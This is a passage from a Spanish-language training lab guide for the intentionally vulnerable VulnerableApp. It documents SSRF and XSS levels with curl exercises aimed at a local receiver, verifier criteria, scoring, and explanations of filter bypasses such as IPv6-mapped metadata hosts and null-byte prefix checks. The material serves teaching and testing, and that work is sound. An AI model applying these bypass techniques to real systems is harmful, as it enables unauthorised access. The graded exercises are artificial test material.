  "value": "Comprobar Audi para el control, 404 para el id desconocido y ausencia de BMW para el payload. Un 200 no prueba IDOR ni seguridad y no se atribuye puntaje por click."
}
```

**Pistas:**

La prueba 404 es funcional y no debe confundirse con un error de base de datos.

El payload no debe llegar al repositorio como SQL ejecutable.

Inspecciona cuerpo y código HTTP; nunca infieras seguridad solo porque una UI responde.

**Corrección recomendada:** Usar validación de entrada con respuesta 400, conservar el repositorio parametrizado y no exponer excepciones del proveedor.

### Límites de esta familia

[
  "El análisis estático se realizó sobre el commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y exclusivamente sobre sqlInjection, sus recursos, tests y la infraestructura mínima de anotaciones/rutas. No se revisaron ni se usaron otras familias.",
  "No se ejecutaron los curls contra target:9090 en este informe; `expected` describe lo que se puede inferir del código y de los tests. El seed del target puede no coincidir con scripts/SQLInjection/db/data.sql, el driver puede redactar mensajes distintos y el manejador global puede convertir excepciones en estados distintos.",
  "La semilla de tests contiene Audi id=1, BMW id=2, Mercedes-Benz id=3 y SKODA id=4. Los ejercicios usan BMW/Audi como marcadores no sensibles. Los payloads originales que consultan users se documentaron conceptualmente en source_files/tests, pero no se reproducen aquí para evitar extracción de datos de otras tablas.",
  "Un check contains BMW aporta evidencia de que una fila conocida fue seleccionada en esa semilla, pero no prueba acceso arbitrario. Un check not_contains BMW no prueba seguridad completa: una respuesta vacía, un 4xx o un 5xx también pueden no contener el marcador. Por eso los ejercicios seguros combinan control funcional, cuerpo, estado HTTP y notas manuales.",
  "Reflejar `moreInfo` o un mensaje de sintaxis demuestra divulgación de error, no necesariamente lectura de datos; un HTTP 200 tampoco demuestra ausencia de SQLi. Los checks manuales deben conservar la diferencia entre código de estado, contenido y causa.",
  "Para XSS, un reflejo de texto no prueba ejecución DOM; para IDOR, un 200 no prueba autorización indebida; y no se atribuye puntaje por hacer click en la interfaz. Esta familia no necesita Mailpit, receiver ni peticiones externas: todos los pasos son GET locales al laboratorio.",
  "No se incluyen comandos externos, reverse shells, acceso a archivos o secretos del host, operaciones destructivas, DDL/DML ni cargas de tiempo/DoS. Las condiciones OR y UNION se limitan a SELECT de la tabla cars y a los marcadores de entrenamiento indicados.",
  "Los niveles L3/L4 de ErrorBased usan filtros de comillas y no están marcados Variant.SECURE aunque los tests no observen fuga de BMW/users con sus payloads; se reportan como no seguros por la concatenación residual y la divulgación de errores, sin afirmar que el bypass de SQLi haya sido reproducido.",
  "La plantilla JavaScript de cada controlador construye la petición como `?id=` y muestra solo una parte del resultado. La verificación recomendada usa curl y el cuerpo HTTP, no el click de la UI ni la apariencia de una imagen."
]

## Solicitudes realizadas por el servidor (SSRF)

La familia SSRF expone el parámetro de consulta obligatorio fileurl. El servidor valida que el valor pueda convertirse en java.net.URL y, según el nivel, aplica ninguna restricción adicional, bloquea el esquema file, bloquea solamente el host literal 169.254.169.254, bloquea los hosts de metadatos que conoce MetaDataServiceMock o permite únicamente la URL exacta del gist configurado. Para una URL no simulada por MetaDataServiceMock, la aplicación abre una URLConnection, lee el cuerpo completo y devuelve JSON con las propiedades content e isValid. Este documento usa únicamente el receptor inocuo local receiver:8081 en comandos reproducibles; no intenta acceder a metadatos, archivos del host ni destinos externos.

### Todos los niveles originales

#### `GET /VulnerableApp/SSRFVulnerability/LEVEL_1`

**Entrada:** {
  "fileurl": {
    "in": "query",
    "required": true,
    "type": "URL absoluta",
    "binding": "@RequestParam(\"fileurl\")"
  }
}

isUrlValid solo construye java.net.URL y llama a toURI. Para cualquier URL sintácticamente válida invoca getGenericVulnerabilityResponseWhenURL. Las URL cuyos host y ruta pertenecen a MetaDataServiceMock reciben una respuesta sintética; las demás se leen mediante URLConnection y su cuerpo se concatena en content. Una URL inválida también responde HTTP 200, pero con content=Provided URL not valid e isValid=false.

[
  "No existe una allowlist de esquema, host, puerto o destino. El código original permite que la funcionalidad del servidor intente leer recursos elegidos por el cliente.",
  "El payload original de attackvectors describe acceso a recursos locales; este informe no lo ejecuta. Las pruebas unitarias también cubren un archivo temporal, pero los ejercicios aquí se limitan al receptor local autorizado.",
  "La anotación usa el htmlTemplate LEVEL_1/SSRF y el método de la anotación queda en GET por el valor predeterminado de requestMethod()."
]

#### `GET /VulnerableApp/SSRFVulnerability/LEVEL_2`

**Entrada:** {
  "fileurl": {
    "in": "query",
    "required": true,
    "type": "URL absoluta",
    "binding": "@RequestParam(\"fileurl\")"
  }
}

Primero exige una URL válida y después exige que URL.getProtocol() no sea exactamente file. URL.getProtocol() normaliza el esquema a minúsculas, por lo que la variante FILE no constituye un bypass en este código. Todas las URL no-file, incluido el receptor local, siguen el mismo flujo de lectura de Level 1 y los hosts simulados por MetaDataServiceMock siguen devolviendo datos sintéticos.

[
  "El control es solo por esquema; no hay restricción de host, resolución DNS, red privada, puerto, redirecciones ni validación del destino final.",
  "SSRFVulnerabilityTest verifica que un archivo temporal y su variante de esquema en mayúsculas sean rechazados, mientras que las URL HTTP de prueba son aceptadas. No se reproduce el caso de archivo en los ejercicios seguros.",
  "El payload de nivel 2 describe el acceso a metadatos; aquí se documenta el comportamiento, pero no se envía ninguna solicitud al servicio de metadatos."
]

#### `GET /VulnerableApp/SSRFVulnerability/LEVEL_3`

**Entrada:** {
  "fileurl": {
    "in": "query",
    "required": true,
    "type": "URL absoluta",
    "binding": "@RequestParam(\"fileurl\")"
  }
}

Aplica las mismas comprobaciones de Level 2 y, si el host de la URL es exactamente 169.254.169.254, devuelve invalidUrlResponse sin realizar el flujo normal. No bloquea el resto de hosts que MetaDataServiceMock reconoce, como las representaciones IPv6-mapped o 169.254.170.2; cuando esos destinos coinciden con la tabla del mock, la aplicación devuelve la respuesta sintética del mock.

[
  "La comparación es new URL(url).getHost().equals(\"169.254.169.254\"), no una validación de IP canónica ni una política de red.",
  "La prueba unitaria contrasta el host IPv4 literal bloqueado con la forma [::ffff:169.254.169.254], que continúa pasando esta comprobación; esto explica por qué el nivel sigue marcado como vulnerable.",
  "El receptor local no pertenece al host bloqueado y sirve como prueba segura de la rama permitida; no se usa como puente hacia ningún destino adicional."
]

#### `GET /VulnerableApp/SSRFVulnerability/LEVEL_4`

**Entrada:** {
  "fileurl": {
    "in": "query",
    "required": true,
    "type": "URL absoluta",
    "binding": "@RequestParam(\"fileurl\")"
  }
}

Rechaza el esquema file y, en lugar de comparar un solo literal, llama a MetaDataServiceMock.isPresent(new URL(url)). Por tanto bloquea los hosts HTTP de la tabla simulada de metadatos y devuelve content=Provided URL not valid e isValid=false para ellos. Cualquier otro destino HTTP válido, incluido receiver:8081, sigue llegando a URLConnection y se puede usar para solicitar servicios internos o medir respuestas; el código no implementa una allowlist general ni un escaneo separado.

[
  "MetaDataServiceMock reconoce únicamente las entradas definidas en su IP_ENVIRONMENT_MAP y solo para el protocolo http; no equivale a una defensa de red completa.",
  "El payload original menciona port scanning, pero el método concreto solo intenta leer la URL proporcionada. Un error de conexión puede propagarse como error de la aplicación, por lo que no debe interpretarse un 200 genérico como prueba de una conexión exitosa.",
  "El ejercicio seguro usa el receptor local, que no está en el mock, y no intenta explorar puertos ni nombres internos."
]

#### `GET /VulnerableApp/SSRFVulnerability/LEVEL_5`

**Entrada:** {
  "fileurl": {
    "in": "query",
    "required": true,
    "type": "URL absoluta",
    "binding": "@RequestParam(\"fileurl\")"
  }
}

Está anotado con variant=Variant.SECURE. Solo cuando gistUrl.equalsIgnoreCase(url), donde gistUrl es https://gist.githubusercontent.com/raw/ seguido de gistId.sasanlabs.projects, se ejecuta la lectura de la URL. Cualquier otra URL válida, incluido receiver:8081, recibe HTTP 200 con content=Provided URL not valid e isValid=false. La igualdad es sobre la URL completa e ignora mayúsculas, no una allowlist por host o ruta separada.

[
  "application.properties fija gistId.sasanlabs.projects=bbf2e2183b8f6252061663ce0ddee79b, y el JavaScript de la plantilla usa la URL completa correspondiente para la carga normal de la interfaz.",
  "El nivel 5 tiene @AttackVector sin clave payload y no declara ChallengeCard; aun así es un nivel original y está incluido por su @VulnerableAppRequestMapping.",
  "La restricción impide el receptor local, por lo que el ejercicio reproducible de este informe es un control negativo seguro. No se solicita el gist externo ni se afirma que esté disponible."
]

### ssrf-01 · Nivel 1: solicitud SSRF controlada al receptor local

Si target puede resolver y alcanzar receiver:8081 y el receptor responde, se espera HTTP 200 con JSON que contenga isValid=true. content debe ser el cuerpo que el receptor entregue; su texto exacto no se presupone. Como control sintáctico, not-a-url debe devolver HTTP 200 con isValid=false y content=Provided URL not valid.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este caso cubre la rama permitida de Level 1 sin consultar metadatos ni archivos. La lectura se hace desde el servidor target, no desde Kali. El control negativo demuestra que el campo llega al método, pero no convierte un estado HTTP 200 en evidencia de SSRF: hay que comprobar el JSON y, para atribución fuerte, correlacionar una solicitud o marcador en el receptor.

Desde Kali, envía la URL únicamente al receptor local autorizado: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_1 --data-urlencode 'fileurl=http://receiver:8081/'

Ejecuta el control de sintaxis inválida, también sin destino externo: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_1 --data-urlencode 'fileurl=not-a-url'

Compara el JSON y, si el laboratorio expone observabilidad del receptor, su registro de la solicitud; no otorgues éxito solo por ver HTTP/1.1 200.

Registrar la misma prueba con el cliente del laboratorio:
lab request ssrf-01 --method GET --param fileurl=http://receiver:8081/

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "json",
      "path": "isValid",
      "value": true
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "VA_LAB_RECEIVER"
    }
  ]
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "SSRFVulnerability/LEVEL_1",
  "method": "GET",
  "params": {
    "fileurl": "not-a-url"
  },
  "check": {
    "kind": "json",
    "path": "isValid",
    "value": false
  }
}
```

**Pistas:**

El parámetro se llama fileurl y es query parameter, no JSON ni formulario POST.

En Level 1 una URL válida alcanza el flujo de URLConnection; la respuesta puede ser un error de infraestructura si receiver no está accesible desde target.

No cambies el valor por un archivo local, una IP de metadatos o un servicio externo.

**Corrección recomendada:** Aplicar una allowlist positiva de esquemas, hosts y puertos necesarios; resolver y validar el destino final después de redirecciones; rechazar destinos loopback, link-local, privados y de metadatos en forma canónica; limitar tiempo, tamaño y saltos, y preferir un proxy de salida con política de red. No confiar en una comprobación de texto del host.

### ssrf-02 · Nivel 2: comprobar que el receptor HTTP sigue permitido

Para el receptor local autorizado se espera, si el receptor está disponible desde target, HTTP 200 con isValid=true. El control not-a-url se espera con isValid=false y content=Provided URL not valid. El ejercicio no ejecuta el caso bloqueado del esquema file ni el caso de metadatos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El receptor demuestra que Level 2 no bloquea todo HTTP: solo añade el filtro del protocolo file. La diferencia frente a Level 1 se verifica estáticamente y con los tests del repositorio, porque los destinos file y de metadatos quedan deliberadamente fuera de los comandos seguros solicitados.

Solicita el receptor inocuo mediante la ruta del nivel 2: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_2 --data-urlencode 'fileurl=http://receiver:8081/'

Ejecuta el control negativo de URL malformada: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_2 --data-urlencode 'fileurl=not-a-url'

Registra por separado si el receptor vio la solicitud originada por target; un 200 sin isValid=true no es verificación suficiente.

Registrar la misma prueba con el cliente del laboratorio:
lab request ssrf-02 --method GET --param fileurl=http://receiver:8081/

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "json",
      "path": "isValid",
      "value": true
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "VA_LAB_RECEIVER"
    }
  ]
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "SSRFVulnerability/LEVEL_2",
  "method": "GET",
  "params": {
    "fileurl": "not-a-url"
  },
  "check": {
    "kind": "json",
    "path": "isValid",
    "value": false
  }
}
```

**Pistas:**

URL.getProtocol() está normalizado en minúsculas por java.net.URL; la prueba de mayúsculas no es un bypass según el código revisado.

El mismo parámetro y el mismo método GET se usan en todos los niveles.

No sustituyas receiver por una IP de metadatos ni por un recurso de Internet.

**Corrección recomendada:** Sustituir el filtro de esquema por una política de salida positiva y centralizada. Validar el host resuelto y cada salto de redirección, bloquear rangos internos y de enlace local, y usar límites de conexión y respuesta. El bloqueo aislado de file no cubre SSRF HTTP.

### ssrf-03 · Nivel 3: control de host exacto con destino inocuo

El receptor no coincide con el host literal que Level 3 bloquea; si es alcanzable desde target, se espera HTTP 200 con JSON isValid=true. Para la entrada not-a-url se espera isValid=false. No se prueba ninguna variante de IP ni el servicio de metadatos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El caso positivo seguro muestra que la nueva comparación no convierte Level 3 en una allowlist: cualquier host diferente al literal bloqueado sigue entrando al fetch. La conclusión de vulnerabilidad se apoya en la comparación exacta y en el test que conserva una representación IPv6-mapped, no en una exploración de infraestructura.

Envía únicamente el receptor local al nivel 3: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_3 --data-urlencode 'fileurl=http://receiver:8081/'

Ejecuta el control negativo de formato: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_3 --data-urlencode 'fileurl=not-a-url'

Correlaciona el resultado con el registro inocuo del receptor si existe; no interpretes el solo estado 200 como demostración del flujo de red.

Registrar la misma prueba con el cliente del laboratorio:
lab request ssrf-03 --method GET --param fileurl=http://receiver:8081/

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "json",
      "path": "isValid",
      "value": true
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "VA_LAB_RECEIVER"
    }
  ]
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "SSRFVulnerability/LEVEL_3",
  "method": "GET",
  "params": {
    "fileurl": "not-a-url"
  },
  "check": {
    "kind": "json",
    "path": "isValid",
    "value": false
  }
}
```

**Pistas:**

La defensa del código compara exactamente new URL(url).getHost() con una cadena.

Un destino seguro distinto del host comparado es suficiente para observar la rama permitida sin tocar metadata.

La revisión no autoriza escaneo de puertos ni pruebas contra IPs internas.

**Corrección recomendada:** Validar destinos contra una allowlist de nombres o identificadores de servicio, resolver DNS de forma segura y verificar la IP resultante en cada conexión; rechazar todas las formas canónicas y no canónicas de redes privadas, loopback, link-local y metadata. Aislar la salida del proceso con controles de red.

### ssrf-04 · Nivel 4: allowlist incompleta frente al receptor local

receiver:8081 no está en la tabla MetaDataServiceMock, por lo que, si el receptor responde y target tiene conectividad, se espera HTTP 200 con isValid=true. La entrada not-a-url debe producir isValid=false. No se realizan port scans ni solicitudes a la tabla de metadatos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este es un positivo controlado para la rama que no coincide con el mock. Level 4 bloquea un conjunto conocido de hosts simulados, pero deja una solicitud HTTP genérica a URLConnection; por eso el control local permite verificar la diferencia entre un filtro específico y una política de salida completa sin enumerar servicios.

Solicita el receptor local autorizado en Level 4: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_4 --data-urlencode 'fileurl=http://receiver:8081/'

Comprueba el control de URL inválida: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_4 --data-urlencode 'fileurl=not-a-url'

Si el receptor ofrece un log de marcador, úsalo para corroborar que la petición salió desde target; no uses respuestas de error o tiempos como escaneo de puertos.

Registrar la misma prueba con el cliente del laboratorio:
lab request ssrf-04 --method GET --param fileurl=http://receiver:8081/

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "json",
      "path": "isValid",
      "value": true
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "VA_LAB_RECEIVER"
    }
  ]
}
```

El verificador también ejecuta y contrasta este control definido por el servidor:

```json
{
  "route": "SSRFVulnerability/LEVEL_4",
  "method": "GET",
  "params": {
    "fileurl": "not-a-url"
  },
  "check": {
    "kind": "json",
    "path": "isValid",
    "value": false
  }
}
```

**Pistas:**

MetaDataServiceMock es una simulación dentro de la aplicación y no una llamada real a un proveedor cloud.

El valor seguro debe permanecer exactamente en http://receiver:8081/.

Si receiver no está accesible desde target, documenta la incertidumbre de conectividad en lugar de convertirla en un resultado de vulnerabilidad.

**Corrección recomendada:** Eliminar la dependencia de una lista parcial de metadatos como control principal. Usar allowlist de destinos de negocio, validación de resolución y redirecciones, límites de recursos y segmentación de red que impida desde el proceso cualquier salida no necesaria.

### ssrf-05 · Nivel 5: control negativo contra la allowlist segura

receiver:8081 no es la URL completa del gist permitido. Se espera HTTP 200 con JSON isValid=false y content=Provided URL not valid, independientemente de que receiver esté levantado, porque la solicitud se rechaza antes de URLConnection. El positivo original sería la URL exacta construida con el gistId configurado, pero no se ejecuta porque este laboratorio limita SSRF a receiver:8081.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El ejercicio comprueba la rama de rechazo de la variante SECURE sin tráfico externo. Es un control negativo seguro y reproducible; no intenta falsificar el gist permitido ni afirma que la URL remota esté disponible. La aceptación del gist se documenta por revisión del código y la configuración.

Envía el receptor local al nivel marcado seguro: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_5 --data-urlencode 'fileurl=http://receiver:8081/'

Ejecuta el control de sintaxis inválida para distinguir el rechazo por formato del rechazo por allowlist: curl -i --get http://target:9090/VulnerableApp/SSRFVulnerability/LEVEL_5 --data-urlencode 'fileurl=not-a-url'

Compara ambos cuerpos JSON; en los dos casos el código responde por invalidUrlResponse, por lo que no debe esperarse ninguna entrada en el log del receptor.

Registrar la misma prueba con el cliente del laboratorio:
lab request ssrf-05 --method GET --param fileurl=http://receiver:8081/

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": false,
  "path": "isValid"
}
```

**Pistas:**

La comparación del nivel 5 cubre la URL completa con equalsIgnoreCase, no solo el nombre de host.

No reemplaces el receptor por el gist externo en un comando: la reproducción autorizada de este informe usa solo el receptor local.

Un HTTP 200 aquí representa la decisión de aplicación, no la disponibilidad ni la lectura de un recurso remoto.

**Corrección recomendada:** Mantener una allowlist estricta de identificadores de servicio en lugar de aceptar URL arbitrarias, pero además evitar concatenar una URL remota mutable como única prueba de seguridad. Restringir egress, verificar esquema/host/puerto/ruta y aplicar timeouts, límites de tamaño y observabilidad.

### Límites de esta familia

[
  "La ruta se deduce de @VulnerableAppRestController(value=SSRFVulnerability), @VulnerableAppRequestMapping(value=LEVEL_n) y EndPointsInformationProvider, que concatena /VulnerableApp/{nombre}/{LEVEL}; las cinco rutas listadas son una verificación de código, no una garantía de que el contenedor esté levantado.",
  "No se ejecutaron los comandos curl durante esta revisión. Los resultados esperados son inferencias del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a, sus tests y la configuración leída; no se debe prometer que los ejercicios funcionarán sin confirmar DNS, conectividad y respuesta de receiver desde target.",
  "El verificador sugerido debe parsear el JSON y revisar isValid y, cuando corresponda, content=Provided URL not valid. HTTP 200 por sí solo no prueba SSRF: los rechazos también devuelven 200 y una conexión fallida puede generar otro resultado. Para una atribución fuerte se necesita un marcador o registro controlado en receiver correlacionado con la solicitud del target, no una inferencia desde Kali.",
  "MetaDataServiceMock produce cuerpos sintéticos para hosts y rutas concretos; por tanto los tests de metadata no prueban acceso a un proveedor cloud real. No se incluyeron comandos contra 169.254.169.254, sus variantes, archivos locales, secretos, puertos arbitrarios ni servicios externos.",
  "El JavaScript de la plantilla parsea content como JSON y construye HTML con innerHTML, pero esa UI no se usa para los ejercicios de SSRF. Un reflejo de texto no prueba ejecución XSS; un HTTP 200 no prueba IDOR; y no se debe atribuir puntaje por hacer clic en una interfaz. Esas señales deben permanecer fuera del verificador SSRF.",
  "La respuesta del receptor no está definida en este repositorio. Por eso los checks positivos solo validan el campo JSON isValid=true y recomiendan corroboración en el receptor; no fijan una cadena de content que podría variar por la imagen del laboratorio.",
  "Level 5 permite una URL remota exacta configurada por gistId.sasanlabs.projects. Ese comportamiento seguro se revisó estáticamente, pero no se prueba en los comandos porque el alcance seguro exige usar únicamente receiver:8081."
]

## Ejecución de scripts en el navegador (XSS)

Revisión exclusiva de la familia XSS en el commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a. La familia contiene XSS reflejado en el atributo src de img, XSS reflejado por inyección de etiquetas HTML y XSS persistente almacenado en POSTS. Las clases llevan @VulnerableAppRestController(value=nombre) y cada método lleva @VulnerableAppRequestMapping(value=LEVEL_n); el controlador central expone por tanto /VulnerableApp/{nombre}/{LEVEL_n}. Salvo indicación contraria, todos los métodos tienen requestMethod GET por defecto y reciben parámetros de consulta. La clasificación vulnerable indica lo que se deduce del flujo de código y de variant=UNSECURE/SECURE; no es una afirmación de que una instancia desplegada haya sido probada. Los ejercicios usan únicamente marcadores benignos que escriben una propiedad data-va-lab en document.body: no leen cookies, no exfiltran datos, no contactan servicios externos y no requieren hacer clic. Un cuerpo de respuesta que refleja una cadena demuestra reflexión o almacenamiento, no ejecución XSS; la ejecución solo puede verificarse en un navegador de laboratorio controlado y con un indicador DOM observable.

### Todos los niveles originales

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_1`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Construye <img src=%s width="400" height="300"/> e interpola src sin comillas, escape ni whitelist.

getVulnerablePayloadLevel1; @AttackVector XSS_DIRECT_INPUT_SRC_ATTRIBUTE_IMG_TAG. Un input puede cerrar o añadir atributos al contexto no entrecomillado. La plantilla JS usa src y escribe la respuesta con innerHTML.

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_2`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Construye <img src="%s" width="400" height="300"/>: añade comillas, pero interpola src sin escape.

getVulnerablePayloadLevel2; @AttackVector XSS_QUOTES_ON_INPUT_SRC_ATTRIBUTE_IMG_TAG. Las comillas delimitadoras no sustituyen al escape contextual.

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_3`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Aplica StringEscapeUtils.escapeHtml4 al valor, pero lo coloca en un atributo src sin comillas.

getVulnerablePayloadLevel3; @AttackVector XSS_HTML_ESCAPE_ON_DIRECT_INPUT_SRC_ATTRIBUTE_IMG_TAG. El propio comentario del código advierte que el escape no evita todos los manejos de eventos en este contexto; el escape HTML genérico no es una validación de URL ni un sustituto de un atributo correctamente delimitado.

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_4`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Solo agrega la respuesta si no se cumplen simultáneamente contains("(") y contains(")"); después aplica escapeHtml4 y la inserta en src sin comillas.

getVulnerablePayloadLevel4; @AttackVector XSS_HTML_ESCAPE_ON_DIRECT_INPUT_AND_REMOVAL_OF_VALUES_WITH_PARENTHESIS_SRC_ATTRIBUTE_IMG_TAG. La condición usa OR negado, por lo que no bloquea entradas que contengan solo una de las dos cadenas; el comentario del código menciona manejadores con backticks.

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_5`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Si hay NUL, valida solo el prefijo frente a la whitelist exacta de /VulnerableApp/images/OWASP.png o ZAP.png, pero construye la respuesta con el valor completo escapado.

getVulnerablePayloadLevel5; @AttackVector XSS_HTML_ESCAPE_PLUS_FILTERING_ON_INPUT_SRC_ATTRIBUTE_IMG_TAG_BUT_NULL_BYTE_VULNERABLE. La diferencia entre el valor validado y el valor renderizado es el caso de entrenamiento; el transporte de un NUL real debe comprobarse solo en el laboratorio y no se representa como un NUL literal en un archivo JSON.

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_6`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Solo permite exactamente las dos rutas de imagen de allowedValues; inserta el valor permitido en un atributo src entrecomillado y aplica escapeHtml4; los demás valores devuelven 400.

getVulnerablePayloadLevel6; variant=SECURE y @AttackVector XSS_QUOTES_AND_WITH_HTML_ESCAPE_ON_INPUT_SRC_ATTRIBUTE_IMG_TAG. La respuesta 200 por sí sola no es prueba de seguridad, pero aquí el flujo combina whitelist, delimitación y escape.

#### `GET /VulnerableApp/XSSInImgTagAttribute/LEVEL_7`

**Entrada:** {
  "src": "@RequestParam(\"src\") String imageLocation"
}

Permite una ruta que empiece por /VulnerableApp/images/ y termine en .png, o una ruta de allowedValues; la inserta entre comillas y usa HtmlUtils.htmlEscapeHex; si no valida devuelve 400.

getVulnerablePayloadLevelSecure; variant=SECURE y sin @AttackVector en el método. La whitelist de prefijo/extensión no prueba que el recurso exista, pero la salida usa comillas y escape hexadecimal.

#### `GET /VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1`

**Entrada:** {
  "value": "La plantilla usa value; el método recibe @RequestParam Map<String,String> queryParams y procesa cualquier clave"
}

Por cada parámetro de consulta produce <div>%s<div> con el valor sin escape.

getVulnerablePayloadLevel1; @AttackVector XSS_HTML_TAG_INJECTION_LEVEL1_DESCRIPTION. La etiqueta de cierre escrita por el código es <div> y no </div>, pero el riesgo relevante es la inserción de HTML no confiable; el JS de la plantilla coloca la respuesta en innerHTML.

#### `GET /VulnerableApp/XSSWithHtmlTagInjection/LEVEL_2`

**Entrada:** {
  "value": "La plantilla usa value; el controlador itera todos los parámetros de consulta"
}

Solo agrega un valor si no coincide con Pattern.compile("[<]+[(script)(img)(a)]+.*[>]+"); la cadena que pasa se inserta sin escape en div.

getVulnerablePayloadLevel2; @AttackVector XSS_HTML_TAG_INJECTION_LEVEL2_DESCRIPTION. El patrón usa clases de caracteres y una lista negativa frágil; permite otras etiquetas y atributos de evento.

#### `GET /VulnerableApp/XSSWithHtmlTagInjection/LEVEL_3`

**Entrada:** {
  "value": "La plantilla usa value; el controlador itera todos los parámetros de consulta"
}

Como LEVEL_2, además descarta valores que contengan literalmente alert o javascript; la comparación es sensible a mayúsculas y el valor permitido se inserta sin escape.

getVulnerablePayloadLevel3; @AttackVector XSS_HTML_TAG_INJECTION_LEVEL3_DESCRIPTION. Es un blacklist parcial: no constituye codificación contextual ni una allowlist de etiquetas/atributos.

#### `GET /VulnerableApp/XSSWithHtmlTagInjection/LEVEL_4`

**Entrada:** {
  "value": "La plantilla usa value; el controlador itera todos los parámetros de consulta"
}

Envuelve cada valor en <div>...</div> y aplica StringEscapeUtils.escapeHtml4 antes de insertarlo.

getSecurePayloadLevel4; variant=SECURE y @AttackVector XSS_SECURE_HTML_ESCAPE_DIV_TAG. La respuesta esperada es texto HTML escapado, no un nodo SVG/script ejecutable.

#### `GET /VulnerableApp/XSSWithHtmlTagInjection/LEVEL_5`

**Entrada:** {
  "value": "La plantilla usa value; el controlador itera todos los parámetros de consulta"
}

Envuelve cada valor en div y aplica HtmlUtils.htmlEscapeHex antes de renderizarlo.

getSecurePayloadLevel5; variant=SECURE y @AttackVector XSS_SECURE_HTML_ESCAPE_HEX_DIV_TAG. La codificación hexadecimal debe contrastarse con la respuesta y no con un click.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; si existe, se guarda en POSTS con levelIdentifier=LEVEL_1"
}

Guarda comment sin transformar y en cada lectura concatena cada contenido como <div id="comments">contenido</div>.

getVulnerablePayloadLevel1; @AttackVector PERSISTENT_XSS_HTML_TAG_URL_PARAM_DIRECTLY_INJECTED_IN_DIV_TAG. PostRepository separa los datos por nivel, pero no neutraliza el HTML. La segunda petición sin comment vuelve a leer lo almacenado.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_2`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_2"
}

Guarda el comentario original; al renderizar reemplaza coincidencias de <img y <input, sensibles a mayúsculas, pero deja el resto del HTML sin escape.

getVulnerablePayloadLevel2; @AttackVector PERSISTENT_XSS_HTML_TAG_URL_PARAM_DIRECTLY_INJECTED_IN_DIV_TAG_REPLACING_IMG_AND_INPUT_TAG. El filtro no cubre SVG, object, atributos o texto HTML alternativo.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_3`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_3"
}

Al renderizar usa IMG_INPUT_TAG_CASE_INSENSITIVE_PATTERN, que reemplaza de forma insensible a mayúsculas <img y <script; el resto se entrega sin escape.

getVulnerablePayloadLevel3; @AttackVector PERSISTENT_XSS_HTML_TAG_URL_PARAM_DIRECTLY_INJECTED_IN_DIV_TAG_REPLACING_IMG_AND_INPUT_TAG_CASE_INSENSITIVE. El patrón implementado contiene <script, no <input como su descripción textual sugiere; aun así no es una sanitización HTML completa.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_4`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_4"
}

El comprobador examina solo el prefijo anterior al primer NUL para decidir si debe sustituir <img/<input; si no encuentra esas etiquetas antes del NUL devuelve el comentario completo sin filtrar.

getVulnerablePayloadLevel4; @AttackVector ...IF_TAGS_ARE_PRESENT_BEFORE_NULL_BYTE. El valor se almacena intacto. No enviar NUL como carácter literal desde un editor; el ejercicio usa una secuencia %00 en una URL de laboratorio y deja la ejecución para verificación manual.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_5`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_5"
}

